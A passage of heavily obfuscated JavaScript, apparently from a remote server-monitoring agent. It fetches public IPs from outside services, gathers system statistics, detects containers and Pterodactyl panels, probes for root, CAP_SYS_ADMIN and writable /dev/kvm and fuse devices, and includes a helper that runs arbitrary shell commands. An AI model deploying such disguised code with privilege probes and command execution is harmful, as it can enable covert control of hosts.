        if (a[e0(0x3a9)](b[e0(0x4dc)], a[e0(0x9d9)]))
            a0P[e0(0x4f6)]('获取\x20IPv4\x20失败:\x20' + b[e0(0x13b)], 0x1);
        if (a[e0(0xb56)](c[e0(0x4dc)], a['mbFxz']))
            a0P[e0(0x4f6)]('获取\x20IPv6\x20失败:\x20' + c['reason'], 0x1);
        return {
            'ipv4': b[e0(0x4dc)] === a[e0(0x3da)] ? b['value'] : null,
            'ipv6': c['status'] === a[e0(0x3da)] ? c[e0(0x7b3)] : null
        };
    }
    static [a0ch(0x5cd)] = '/proc';
    static [a0ch(0xb58)] = a0ch(0x241);
    static [a0ch(0x15a)] = a0ch(0x586);
    static [a0ch(0x571)] = a0ch(0x1c3);
    static [a0ch(0x2f2)] = '/';
    [a0ch(0x8bd)]() {
        const e1 = a0ch, a = {
                'Lcwec': function (d, f) {
                    return d !== f;
                },
                'BCzGg': e1(0xbc1),
                'aSaHB': e1(0x2a1),
                'WEIyC': e1(0xa82),
                'mUsyT': function (d) {
                    return d();
                },
                'JQjRY': '(none)'
            };
        if (a[e1(0xcd5)](process[e1(0xa65)], a['BCzGg']))
            return [];
        const b = [], c = [
                [
                    e1(0x5ed),
                    () => this[e1(0xb87)]()
                ],
                [
                    e1(0xa95),
                    () => this['_markKvm']()
                ],
                [
                    a[e1(0x2a6)],
                    () => this[e1(0x822)]()
                ],
                [
                    e1(0xc08),
                    () => this[e1(0x924)]()
                ],
                [
                    a[e1(0x7eb)],
                    () => this['_markFuse']()
                ]
            ];
        for (const [d, f] of c) {
            try {
                if (a[e1(0xabd)](f))
                    b['push'](d);
            } catch (g) {
                a0P[e1(0x4f6)]('marks\x20探测失败\x20[' + d + e1(0x73d) + g[e1(0x8f9)], 0x1);
            }
        }
        return a0P[e1(0x4f6)]('marks\x20命中:\x20' + (b['join'](',') || a[e1(0x136)]), 0x1), b;
    }
    [a0ch(0xb87)]() {
        const e2 = a0ch, a = {
                'xwwkM': function (b, c) {
                    return b !== c;
                },
                'PPxQS': e2(0x686),
                'MoPvx': function (b, c) {
                    return b === c;
                }
            };
        if (a[e2(0xbb4)](typeof process[e2(0x20d)], a[e2(0x6fa)]) || typeof process[e2(0x9cb)] !== a[e2(0x6fa)])
            return ![];
        return a['MoPvx'](process[e2(0x20d)](), 0x0) && a[e2(0xd12)](process[e2(0x9cb)](), 0x0);
    }
    ['_markKvm']() {
        const e3 = a0ch, a = { 'THPoQ': e3(0xa95) };
        return a0ac[e3(0xb48)](a0o[e3(0xaa7)](a0ac[e3(0xb58)], a[e3(0x7b8)]), 0xa, 0xe8);
    }
    [a0ch(0x111)]() {
        const e4 = a0ch, a = {
                'MRvPX': e4(0xa82),
                'eTgEZ': e4(0xad0),
                'zFXzN': e4(0xa6d),
                'UaeqF': e4(0x27b),
                'IaNvE': function (b, c) {
                    return b & c;
                },
                'zOzcL': function (b, c) {
                    return b & c;
                }
            };
        if (!a0ac[e4(0xb48)](a0o[e4(0xaa7)](a0ac[e4(0xb58)], a[e4(0x44d)]), 0xa, 0xe5))
            return ![];
        if (this[e4(0x5ea)](0x15))
            return !![];
        for (const b of [
                a[e4(0x593)],
                e4(0xace),
                a[e4(0x410)],
                a[e4(0x80f)]
            ]) {
            try {
                const c = a0l['statSync'](a0o[e4(0xaa7)](a0ac[e4(0x2f2)], b));
                if (c[e4(0xbdd)]() && a[e4(0x8eb)](c[e4(0x2f3)], 0x800) && a[e4(0x829)](c['mode'], 0x49))
                    return !![];
            } catch {
            }
        }
        return ![];
    }
    [a0ch(0x822)]() {
        const e5 = a0ch, a = {
                'iwyDL': e5(0x816),
                'eyyPC': e5(0xabb),
                'JaYzX': e5(0x2c0),
                'MZUCF': e5(0xc74),
                'QPate': e5(0xa56),
                'foEtA': 'home',
                'ZcXFf': e5(0x353),
                'WeSVC': function (g, h) {
                    return g !== h;
                },
                'UcHGu': e5(0x686),
                'oKwyW': e5(0xc83),
                'AHDWY': function (g, h) {
                    return g > h;
                },
                'QeSEw': function (g, h) {
                    return g === h;
                },
                'mlFvF': e5(0x5d9)
            };
        if (a0ac['_fileContains'](a0o[e5(0xaa7)](a0ac[e5(0x5cd)], a[e5(0xc0a)], a[e5(0x269)]), Buffer[e5(0x8c2)]('/var/lib/pterodactyl/')))
            return !![];
        for (const g of [
                a['iwyDL'],
                '1'
            ]) {
            const h = a0ac['_readLimited'](a0o[e5(0xaa7)](a0ac[e5(0x5cd)], g, a[e5(0x32e)]));
            if (!h)
                continue;
            const i = h[e5(0x1d9)](a[e5(0xcad)])[e5(0xbb0)]('\x00'), j = i[e5(0xb7b)](l => l[e5(0xc9b)](e5(0xb3e))), k = i['some'](l => l['startsWith'](e5(0x16a)));
            if (j && k)
                return !![];
        }
        const b = a0ac[e5(0x3d0)](a0o[e5(0xaa7)](a0ac['MARKS_ETC_ROOT'], a[e5(0xa00)]));
        if (!b)
            return ![];
        const c = b[e5(0x1d9)](a[e5(0xcad)])[e5(0x40e)]()['toLowerCase']();
        if (!/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/[e5(0x8d7)](c))
            return ![];
        try {
            if (!a0l[e5(0x4e2)](a0o[e5(0xaa7)](a0ac[e5(0x2f2)], a[e5(0x93b)], a[e5(0x5b9)]))[e5(0x60e)]())
                return ![];
        } catch {
            return ![];
        }
        if (a[e5(0xce9)](typeof process[e5(0x20d)], a['UcHGu']))
            return ![];
        const d = process[e5(0x20d)](), f = a0ac[e5(0x3d0)](a0o[e5(0xaa7)](a0ac[e5(0x15a)], a[e5(0x8ce)]));
        if (!f)
            return ![];
        for (const l of f[e5(0x1d9)](a[e5(0xcad)])[e5(0xbb0)]('\x0a')) {
            const m = l[e5(0xbb0)](':');
            if (a[e5(0x681)](m[e5(0xed)], 0x2) && a[e5(0x8c7)](Number(m[0x2]), d))
                return ![];
        }
        return a0l[e5(0x8d6)](a0o[e5(0xaa7)](a0ac[e5(0x2f2)], e5(0x5e8))) || a0l[e5(0x8d6)](a0o[e5(0xaa7)](a0ac[e5(0x571)], a[e5(0xc6f)]));
    }
    [a0ch(0x924)]() {
        const e6 = a0ch, a = {
                'mCQuz': e6(0xc08),
                'lzHaz': 'system',
                'pjXDV': e6(0x1a2),
                'TtKQy': 'exe'
            };
        try {
            if (!a0l['statSync'](a0o[e6(0xaa7)](a0ac[e6(0x571)], a[e6(0xa25)], a['lzHaz']))[e6(0x60e)]())
                return ![];
        } catch {
            return ![];
        }
        if (!a0l[e6(0x8d6)](a0o[e6(0xaa7)](a0ac[e6(0x571)], a[e6(0xa25)], a[e6(0x5f2)])) && !a0l[e6(0x8d6)](a0o[e6(0xaa7)](a0ac[e6(0x571)], e6(0x276), e6(0x85e))))
            return ![];
        if (!a0ac[e6(0x6fb)]())
            return ![];
        const b = a0ac['_readLimited'](a0o[e6(0xaa7)](a0ac['MARKS_PROC_ROOT'], '1', 'comm'));
        if (b) {
            const c = b[e6(0x1d9)]('utf8')[e6(0x40e)]();
            if (c)
                return c['toLowerCase']()['includes'](a[e6(0xa25)]);
        }
        try {
            const d = a0l[e6(0x8ae)](a0o['join'](a0ac['MARKS_PROC_ROOT'], '1', a[e6(0xb3d)]));
            if (d && !a0o[e6(0xcef)](d)[e6(0xacd)]()[e6(0x659)](a[e6(0xa25)]))
                return ![];
        } catch {
        }
        return !![];
    }
    [a0ch(0x5ea)](a) {
        const e7 = a0ch, b = {
                'UZLJm': e7(0x816),
                'BiCJk': 'utf8',
                'gphWW': 'CapEff:',
                'WbwfV': function (d, f) {
                    return d < f;
                },
                'zouRH': function (d, f) {
                    return d === f;
                },
                'drmNi': function (d, f) {
                    return d(f);
                }
            }, c = a0ac['_readLimited'](a0o[e7(0xaa7)](a0ac[e7(0x5cd)], b[e7(0x5c8)], e7(0x4dc)));
        if (!c)
            return ![];
        for (const d of c['toString'](b[e7(0x7a1)])[e7(0xbb0)]('\x0a')) {
            if (d['startsWith'](b[e7(0x12f)])) {
                const f = d[e7(0xbb0)](/\s+/);
                if (b[e7(0xac2)](f['length'], 0x2))
                    return ![];
                try {
                    return b['zouRH'](b[e7(0x5ce)](BigInt, '0x' + f[0x1]) >> b[e7(0x5ce)](BigInt, a) & 0x1n, 0x1n);
                } catch {
                    return ![];
                }
            }
        }
        return ![];
    }
    static [a0ch(0x6fb)]() {
        const e8 = a0ch, a = {
                'SzgHx': 'usr/bin/systemctl',
                'llkkj': e8(0x49f),
                'qoexU': e8(0x61d),
                'qnJug': e8(0x80c)
            };
        for (const b of [
                a['SzgHx'],
                a[e8(0xc75)],
                a[e8(0x92b)]
            ]) {
            if (a0ac['_executable'](a0o['join'](a0ac[e8(0x2f2)], b)))
                return !![];
        }
        for (const c of (process.env.PATH || '')[e8(0xbb0)](a0o[e8(0xad8)])) {
            if (c && a0ac[e8(0x120)](a0o[e8(0xaa7)](c, a['qnJug'])))
                return !![];
        }
        return ![];
    }
    static [a0ch(0x120)](a) {
        const e9 = a0ch, b = {
                'Znxri': function (c, d) {
                    return c !== d;
                },
                'pkBMF': function (c, d) {
                    return c & d;
                }
            };
        try {
            const c = a0l[e9(0x4e2)](a);
            return c[e9(0xbdd)]() && b[e9(0x68a)](b['pkBMF'](c[e9(0x2f3)], 0x49), 0x0);
        } catch {
            return ![];
        }
    }
    static [a0ch(0xb48)](a, b, c) {
        const ea = a0ch, d = {
                'fSDMo': function (f, g) {
                    return f !== g;
                },
                'cOVOy': function (f, g) {
                    return f !== g;
                }
            };
        try {
            const f = a0l[ea(0x4e2)](a);
            if (!f[ea(0xd33)]())
                return ![];
            if (d['fSDMo'](a0ac[ea(0x60f)](f[ea(0xa39)]), b) || d[ea(0x4d6)](a0ac['_devMinor'](f[ea(0xa39)]), c))
                return ![];
            const g = a0l[ea(0xd52)](a, 'r+');
            try {
                return !![];
            } finally {
                a0l['closeSync'](g);
            }
        } catch {
            return ![];
        }
    }
    static ['_devMajor'](a) {
        const eb = a0ch, b = {
                'qhudx': function (f, g) {
                    return f % g;
                },
                'cCTTz': function (f, g) {
                    return f / g;
                },
                'gkdgz': function (f, g) {
                    return f | g;
                },
                'JllJu': function (f, g) {
                    return f & g;
                }
            }, c = b['qhudx'](Math[eb(0x579)](a / 0x100), 0x1000), d = Math[eb(0x579)](b[eb(0xd36)](a, 0x100000000));
        return b[eb(0x6c4)](c, b['JllJu'](d, ~0xfff)) >>> 0x0;
    }
    static [a0ch(0xf8)](a) {
        const ec = a0ch, b = {
                'NShBR': function (f, g) {
                    return f % g;
                },
                'zwEBD': function (f, g) {
                    return f / g;
                },
                'NEcOu': function (f, g) {
                    return f >>> g;
                }
            }, c = a % 0x100, d = b[ec(0xbbc)](Math[ec(0x579)](b[ec(0x744)](a, 0x1000)), 0x100000) & 0xfff00;
        return b[ec(0x2e4)](c | d, 0x0);
    }
    static [a0ch(0x3d0)](a, b = 0x400 * 0x400) {
        const ed = a0ch, c = {
                'fXGVa': function (f, g) {
                    return f - g;
                }
            };
        let d = null;
        try {
            d = a0l[ed(0xd52)](a, 'r');
            const f = Buffer[ed(0x9e7)](0x2000), g = [];
            let h = 0x0;
            while (h < b) {
                const i = a0l['readSync'](d, f, 0x0, Math[ed(0x2dc)](f['length'], c['fXGVa'](b, h)), null);
                if (!i)
                    break;
                g['push'](Buffer[ed(0x8c2)](f['subarray'](0x0, i))), h += i;
            }
            return Buffer[ed(0x653)](g);
        } catch {
            return null;
        } finally {
            if (d !== null)
                try {
                    a0l[ed(0xd13)](d);
                } catch {
                }
        }
    }
    static [a0ch(0x258)](a, b, c = 0x400 * 0x400, d = 0x2000) {
        const ee = a0ch, f = {
                'vAytW': function (h, i) {
                    return h - i;
                },
                'tAxud': function (h, i) {
                    return h - i;
                },
                'szRle': function (h, i) {
                    return h !== i;
                }
            };
        let g = null;
        try {
            g = a0l[ee(0xd52)](a, 'r');
            const h = Math[ee(0x434)](0x0, f[ee(0xb01)](b[ee(0xed)], 0x1)), i = Buffer[ee(0x9e7)](d);
            let j = Buffer[ee(0x9e7)](0x0), k = 0x0;
            while (k < c) {
                const l = a0l[ee(0x52f)](g, i, 0x0, Math['min'](d, f['tAxud'](c, k)), null);
                if (!l)
                    break;
                k += l;
                const m = Buffer['concat']([
                    j,
                    i[ee(0x4b4)](0x0, l)
                ]);
                if (m[ee(0xfa)](b) !== -0x1)
                    return !![];
                j = h ? Buffer[ee(0x8c2)](m[ee(0x4b4)](Math[ee(0x434)](0x0, f['vAytW'](m[ee(0xed)], h)))) : Buffer['alloc'](0x0);
            }
            return ![];
        } catch {
            return ![];
        } finally {
            if (f['szRle'](g, null))
                try {
                    a0l['closeSync'](g);
                } catch {
                }
        }
    }
    [a0ch(0x577)]() {
        const ef = a0ch, a = {
                'IuWwp': function (c, d) {
                    return c === d;
                },
                'NANMV': function (c, d) {
                    return c === d;
                }
            }, b = a0p[ef(0x7cf)]();
        for (const c of Object[ef(0x2a2)](b)) {
            for (const d of b[c]) {
                const f = a[ef(0xb5a)](d[ef(0xca8)], 'IPv4') || a[ef(0x1f8)](d[ef(0xca8)], 0x4);
                if (f && !d[ef(0x505)]) {
                    if (!/^10\./[ef(0x8d7)](d['address']) && !/^192\.168\./['test'](d[ef(0x456)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[ef(0x8d7)](d[ef(0x456)]))
                        return d[ef(0x456)];
                }
            }
        }
        return null;
    }
    async [a0ch(0xd39)]() {
        const eg = a0ch, a = {
                'EmFVw': eg(0x95d),
                'clVeN': eg(0x1cf),
                'ycuNV': 'https://checkip.amazonaws.com',
                'blPca': 'https://ifconfig.me/ip',
                'UQjtb': 'https://ipecho.net/plain',
                'wHUPh': eg(0x47b),
                'hVfJJ': eg(0x7fe)
            }, b = [
                a['EmFVw'],
                a[eg(0xc27)],
                a[eg(0xc9e)],
                a[eg(0x511)],
                a[eg(0x93c)],
                a[eg(0x8df)],
                a[eg(0x985)]
            ];
        for (const d of b) {
            try {
                const f = await this['fetchIP'](d, 0x4);
                if (f && this[eg(0xc9d)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[eg(0x577)]();
        if (c && this[eg(0xc9d)](c))
            return c;
        return null;
    }
    [a0ch(0xc4b)]() {
        const eh = a0ch, a = {
                'umlZp': function (c, d) {
                    return c === d;
                },
                'CmCVr': 'fe80:'
            }, b = a0p[eh(0x7cf)]();
        for (const c of Object[eh(0x2a2)](b)) {
            for (const d of b[c]) {
                const f = a[eh(0x54d)](d['family'], 'IPv6') || d[eh(0xca8)] === 0x6;
                if (f && !d['internal']) {
                    if (!d[eh(0x456)][eh(0xacd)]()[eh(0xc9b)](a[eh(0xd54)]))
                        return d[eh(0x456)];
                }
            }
        }
        return null;
    }
    async [a0ch(0x3b3)]() {
        const ei = a0ch, a = {
                'mhhEb': ei(0xad7),
                'qiQDk': 'https://icanhazip.com'
            }, b = this[ei(0xc4b)]();
        if (b && this['isValidIPv6'](b))
            return b;
        const c = [
            a[ei(0x646)],
            a[ei(0x35f)],
            ei(0x64a)
        ];
        for (const d of c) {
            try {
                const f = await this[ei(0x329)](d, 0x6);
                if (f && this[ei(0x2ab)](f))
                    return f;
            } catch (g) {
                a0P[ei(0x4f6)](ei(0x5cc) + d + ei(0xf9) + g[ei(0x8f9)]);
                continue;
            }
        }
        return null;
    }
    async [a0ch(0x329)](a, b = 0x0) {
        const ej = a0ch, c = {
                'OFPEi': function (d, f) {
                    return d(f);
                },
                'VKlIJ': ej(0x649),
                'GheAd': ej(0xa40),
                'jElAo': function (d, f) {
                    return d(f);
                },
                'viOKF': function (d, f) {
                    return d(f);
                },
                'zVifb': ej(0x481)
            };
        return new Promise((d, f) => {
            const el = ej, g = {
                    'yunMP': function (k, l) {
                        const ek = a0b;
                        return c[ek(0xa41)](k, l);
                    },
                    'nbwuF': c[el(0x3d7)],
                    'ajMqM': c[el(0xc0c)],
                    'dumbx': function (k, l) {
                        const em = el;
                        return c[em(0xf0)](k, l);
                    },
                    'nvhBx': '请求超时'
                }, h = c[el(0x5a0)](require, c[el(0x326)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': 'text/plain' }
                }, j = h[el(0x850)](a, i, k => {
                    const en = el;
                    let l = '';
                    if (k['statusCode'] !== 0xc8) {
                        g[en(0xa2a)](f, new Error('HTTP\x20' + k[en(0xca6)]));
                        return;
                    }
                    k['on'](g[en(0x63e)], m => l += m), k['on'](g[en(0xcf7)], () => d(l[en(0x40e)]()));
                });
            j['on'](el(0xb4f), f), j['setTimeout'](0x1388, () => {
                const eo = el;
                j[eo(0x3d8)](), g['dumbx'](f, new Error(g[eo(0x834)]));
            });
        });
    }
    [a0ch(0xc9d)](a) {
        return /^(\d{1,3}\.){3}\d{1,3}$/['test'](a);
    }
    [a0ch(0x2ab)](a) {
        const ep = a0ch;
        if (!/^[0-9a-fA-F:]+$/[ep(0x8d7)](a) || !a['includes'](':'))
            return ![];
        const b = a[ep(0xbb0)](':')[0x0];
        return /^[23][0-9a-fA-F]{3}$/[ep(0x8d7)](b);
    }
    async [a0ch(0x6c6)]() {
        const eq = a0ch, a = {
                'lFZmN': function (m, n) {
                    return m / n;
                },
                'EDzjk': function (m, n) {
                    return m - n;
                },
                'eOqZF': function (m, n) {
                    return m - n;
                },
                'DiAWR': function (m, n) {
                    return m - n;
                },
                'vssPW': function (m, n) {
                    return m / n;
                },
                'dQAxD': function (m, n) {
                    return m * n;
                },
                'OMmKP': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[eq(0xbd6)]([
                a0u['currentLoad'](),
                a0u[eq(0x4e0)](),
                a0u[eq(0x9a5)](),
                a0u['currentLoad']()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[eq(0xb8c)](Date[eq(0x156)](), 0x3e8), i = a[eq(0x371)](h, this[eq(0x4ef)]), j = a[eq(0x172)](g[eq(0x144)], this[eq(0x201)]['tx']), k = a[eq(0x44b)](g[eq(0x3d4)], this['lastNetworkStats']['rx']);
        this['totalNetworkUp'] += j, this[eq(0xb99)] += k, this[eq(0x201)] = {
            'tx': g[eq(0x144)],
            'rx': g[eq(0x3d4)]
        }, this['lastNetworkTime'] = h;
        const l = await a0u[eq(0xb33)]();
        return {
            'cpu': { 'usage': Math[eq(0x23a)](b[eq(0x2b7)]) },
            'ram': {
                'total': c[eq(0xc84)],
                'used': c[eq(0x56c)]
            },
            'swap': {
                'total': c[eq(0x852)],
                'used': c[eq(0x689)]
            },
            'load': {
                'load1': a[eq(0x684)](Math['round'](f[eq(0x175)] * 0x64), 0x64),
                'load5': a[eq(0x684)](Math[eq(0x23a)](a[eq(0x831)](f[eq(0x175)], 0x64)), 0x64),
                'load15': a[eq(0x684)](Math['round'](a[eq(0x831)](f['avgLoad'], 0x64)), 0x64)
            },
            'disk': await this[eq(0x259)](),
            'network': {
                'up': Math['round'](a[eq(0xb8c)](j, i)),
                'down': Math['round'](a['OMmKP'](k, i)),
                'totalUp': this[eq(0xa06)],
                'totalDown': this[eq(0xb99)]
            },
            'connections': await this['_getConnections'](),
            'uptime': a0p['uptime'](),
            'process': l?.[eq(0xbd6)] || 0x0,
            'message': ''
        };
    }
    async ['_getVirtualization']() {
        const er = a0ch, a = {
                'PFrTx': er(0x239),
                'gVivg': er(0xd47),
                'ZHDGz': '/run/.containerenv',
                'aKaGq': 'Podman',
                'fCGUx': '/proc/1/cgroup',
                'eiAKG': er(0xc74),
                'jPVpd': er(0x827),
                'cLwpR': er(0x2f9),
                'hmIjS': er(0xbf3),
                'jddMC': 'Kubernetes',
                'eFWQE': er(0x956),
                'vzCra': '/proc/self/mountinfo',
                'WieJf': er(0x828),
                'qgrut': er(0x6e3),
                'GZgZF': er(0x8b1),
                'iPDxT': er(0xbb3),
                'PkVpW': er(0xd65),
                'VAlwe': 'QEMU',
                'jAvLq': er(0x8ff)
            };
        try {
            if (a0l[er(0x8d6)](a[er(0x845)]))
                return a[er(0x3b0)];
            if (a0l[er(0x8d6)](a[er(0x83f)]))
                return a['aKaGq'];
            if (a0l[er(0x8d6)](a[er(0x149)])) {
                const b = a0l[er(0x8fc)](a[er(0x149)], a[er(0x607)])[er(0xacd)]();
                if (b[er(0x659)](a[er(0x87b)]) || b[er(0x659)](a['cLwpR']))
                    return a[er(0x3b0)];
                else {
                    if (b[er(0x659)](a[er(0x78b)]))
                        return a[er(0x805)];
                    else {
                        if (b[er(0x659)](a['eFWQE']))
                            return er(0xbb3);
                    }
                }
            }
            if (a0l[er(0x8d6)](a[er(0xae9)])) {
                const c = a0l['readFileSync'](a['vzCra'], a[er(0x607)]);
                if (c[er(0x659)]('/docker/containers/') || c[er(0x659)](er(0x7e8)))
                    return a[er(0x3b0)];
                else {
                    if (c['includes'](a[er(0x632)]) || c[er(0x659)]('kubelet'))
                        return er(0xcbf);
                }
            }
            if (a0l[er(0x8d6)](a[er(0x540)])) {
                const d = a0l[er(0x8fc)](er(0x6e3), a['eiAKG']);
                if (d[er(0x659)](a['GZgZF']))
                    return a[er(0x56e)];
            }
            if (a0l[er(0x8d6)](a[er(0xa8a)])) {
                const f = a0l['readFileSync'](a['PkVpW'], er(0xc74));
                if (f[er(0x659)](er(0x9d1)) || f['includes']('KVM'))
                    return a[er(0x143)];
            }
        } catch (g) {
        }
        return a[er(0x6b1)];
    }
    async ['_getDiskInfo']() {
        const es = a0ch, a = {
                'qFRrR': function (b, c) {
                    return b > c;
                },
                'zLciN': 'overlay',
                'oQrBh': '/dev/'
            };
        try {
            const b = await a0u[es(0xd28)](), c = b[es(0x29a)](g => {
                    const et = es;
                    return a[et(0x5ec)](g['size'], 0x0) && g[et(0x430)] !== 'tmpfs' && g[et(0x430)] !== a[et(0x4b9)] && g['fs']['startsWith'](a[et(0x3c1)]);
                }), d = c['reduce']((g, h) => g + h[es(0x677)], 0x0), f = c['reduce']((g, h) => g + h[es(0xa72)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0ch(0x8bf)]() {
        const eu = a0ch;
        try {
            const a = await a0u['networkConnections'](), b = a[eu(0x29a)](d => d[eu(0x711)] === eu(0x89d))[eu(0xed)], c = a[eu(0x29a)](d => d['protocol'] === eu(0x568))['length'];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0ad {
    static async ['execute'](a, b = {}) {
        const ev = a0ch, c = {
                'ioUbv': function (d, f) {
                    return d - f;
                },
                'MlCYL': function (d, f) {
                    return d || f;
                },
                'Mkrgd': function (d, f) {
                    return d === f;
                },
                'YwMkN': ev(0x62a),
                'CXIqi': function (d, f) {
                    return d(f);
                },
                'TxSdA': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'bbtFn': function (d, f) {
                    return d * f;
                },
                'uEoFi': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[ev(0x72b)](),
                env: env = {},
                timeout: timeout = a0a1[ev(0x3b6)]
            } = b;
        return new Promise(d => {
            const ew = ev, f = Date['now'](), g = c['TxSdA'](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': c['bbtFn'](timeout, 0x3e8),
                    'maxBuffer': c[ew(0x35c)](0xa * 0x400, 0x400)
                }, (h, i, j) => {
                    const ex = ew, k = c[ex(0x37b)](Date['now'](), f), l = h && h[ex(0x2ee)] && h['signal'];
                    let m = c[ex(0xd16)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c['Mkrgd'](typeof h[ex(0xa9d)], c[ex(0x84d)]) ? n = h['code'] : n = -0x1;
                    }
                    c['CXIqi'](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0ae(a) {
    const ey = a0ch, b = {
            'VwVkU': function (c, d) {
                return c === d;
            }
        };
    try {
        const c = a0l[ey(0x636)][ey(0x569)](a0o[ey(0x6ad)](a0a1[ey(0x229)])), d = a0o['resolve'](a);
        let f = d;
        while (!a0l[ey(0x8d6)](f)) {
            const j = a0o['dirname'](f);
            if (b['VwVkU'](j, f))
                return ![];
            f = j;
        }
        const g = a0l[ey(0x636)][ey(0x569)](f), h = a0o[ey(0x65c)](c, g);
        if (h[ey(0xc9b)]('..') || a0o[ey(0x3c2)](h))
            return ![];
        const i = a0o['relative'](f, d);
        if (i && (i[ey(0xc9b)]('..') || a0o[ey(0x3c2)](i)))
            return ![];
        return !![];
    } catch (k) {
        return ![];
    }
}
class a0af {
    static [a0ch(0x923)] = 0x4e20;
    static [a0ch(0xca7)] = 0x200 * 0x400 * 0x400;
    static [a0ch(0x35e)] = 0x1f4;
    static ['_crcTable'] = null;
    static ['_crc32'](a) {
        const ez = a0ch, b = {
                'pPoGh': function (g, h) {
                    return g < h;
                },
                'yXHrQ': function (g, h) {
                    return g & h;
                },
                'tsBiT': function (g, h) {
                    return g ^ h;
                },
                'RxYBf': function (g, h) {
                    return g >>> h;
                },
                'CZIoH': function (g, h) {
                    return g < h;
                },
                'TBSxo': function (g, h) {
                    return g ^ h;
                },
                'YRSEA': function (g, h) {
                    return g >>> h;
                }
            };
        if (!a0af[ez(0x3e4)]) {
            const g = new Int32Array(0x100);
            for (let h = 0x0; h < 0x100; h++) {
                let j = h;
                for (let l = 0x0; b['pPoGh'](l, 0x8); l++)
                    j = b[ez(0x8b2)](j, 0x1) ? b['tsBiT'](0xedb88320, b[ez(0x833)](j, 0x1)) : j >>> 0x1;
                g[h] = j;
            }
            a0af[ez(0x3e4)] = g;
        }
        const d = a0af['_crcTable'];
        let f = -0x1;
        for (let m = 0x0; b[ez(0xa08)](m, a[ez(0xed)]); m++)
            f = b[ez(0x34f)](f >>> 0x8, d[(f ^ a[m]) & 0xff]);
        return b['YRSEA'](b['tsBiT'](f, -0x1), 0x0);
    }
    static [a0ch(0x3ec)](a) {
        const eA = a0ch, b = {
                'PDugw': function (g, h) {
                    return g & h;
                },
                'iHnwU': function (g, h) {
                    return g >> h;
                },
                'KeXGE': function (g, h) {
                    return g | h;
                },
                'szXgl': function (g, h) {
                    return g | h;
                },
                'JjaXC': function (g, h) {
                    return g << h;
                },
                'QNfGi': function (g, h) {
                    return g - h;
                }
            }, c = b[eA(0xafe)](a[eA(0x617)]() << 0xb | a[eA(0xa81)]() << 0x5 | b[eA(0x496)](a['getSeconds'](), 0x1), 0xffff), f = b['PDugw'](b[eA(0x47a)](b[eA(0xb10)](b[eA(0xb90)](b[eA(0x62e)](a[eA(0x620)](), 0x7bc), 0x9), b[eA(0xb90)](a[eA(0xa50)]() + 0x1, 0x5)), a[eA(0x730)]()), 0xffff);
        return {
            'time': c,
            'date': f
        };
    }
    static [a0ch(0x911)](a) {
        const eB = a0ch, b = {
                'gBAxd': function (i, j) {
                    return i < j;
                },
                'PuwiG': function (i, j) {
                    return i - j;
                },
                'aUaYd': function (i, j) {
                    return i >= j;
                },
                'wLGvN': 'utf8',
                'sffxG': function (i, j) {
                    return i > j;
                },
                'iqPJy': function (i, j) {
                    return i < j;
                },
                'bZbbV': function (i, j) {
                    return i(j);
                },
                'oNULm': function (i, j) {
                    return i(j);
                },
                'ZrMqU': function (i, j) {
                    return i + j;
                }
            }, c = a0l[eB(0xd52)](a, 'w'), d = [];
        let f = 0x0, g = 0x0;
        const h = i => {
            const eC = eB;
            let j = 0x0;
            while (b[eC(0x308)](j, i['length']))
                j += a0l[eC(0x54b)](c, i, j, b[eC(0x314)](i[eC(0xed)], j));
        };
        return {
            'add'(i, j, k, l = ![]) {
                const eD = eB;
                if (b['aUaYd'](g, a0af[eD(0x923)]))
                    return ![];
                const m = Buffer[eD(0x8c2)](i, b['wLGvN']);
                j = j || Buffer['alloc'](0x0);
                const n = l ? 0x0 : a0af['_crc32'](j);
                let o = 0x0, p = j;
                if (!l && b[eD(0xc63)](j[eD(0xed)], 0x0)) {
                    const u = a0n[eD(0xb1f)](j, { 'level': 0x6 });
                    b[eD(0xaae)](u[eD(0xed)], j[eD(0xed)]) && (o = 0x8, p = u);
                }
                const {
                        time: q,
                        date: r
                    } = a0af[eD(0x3ec)](k || new Date()), s = Buffer[eD(0x9e7)](0x1e);
                s['writeUInt32LE'](0x4034b50, 0x0), s[eD(0x5a2)](0x14, 0x4), s[eD(0x5a2)](0x800, 0x6), s[eD(0x5a2)](o, 0x8), s[eD(0x5a2)](q, 0xa), s[eD(0x5a2)](r, 0xc), s[eD(0x3f9)](n, 0xe), s[eD(0x3f9)](p[eD(0xed)], 0x12), s[eD(0x3f9)](j['length'], 0x16), s[eD(0x5a2)](m[eD(0xed)], 0x1a), s[eD(0x5a2)](0x0, 0x1c), b[eD(0x23e)](h, s), b['bZbbV'](h, m), b[eD(0xcc7)](h, p);
                const t = Buffer[eD(0x9e7)](0x2e);
